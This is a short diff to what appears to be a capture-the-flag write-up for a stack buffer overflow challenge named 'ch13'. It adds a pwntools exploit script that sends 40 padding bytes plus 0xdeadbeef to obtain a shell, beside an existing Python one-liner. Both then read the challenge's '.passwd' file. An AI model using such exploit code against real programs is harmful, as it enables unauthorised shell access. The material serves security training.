@@ -6,6 +6,18 @@ We have to give ``deadbeef`` in reverse order since the stack reads them in the 
 
 ```cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13``` 
 
+```
+from pwn import *
+
+io = process("./ch13")
+payload = b"A"*40
+payload += p64(0xdeadbeef)
+io.sendline(payload)
+io.interactive()
+```
+
+For both the exploits we get the shell
+
 Then do ``ls -al``.
 
 And ``cat .passwd``
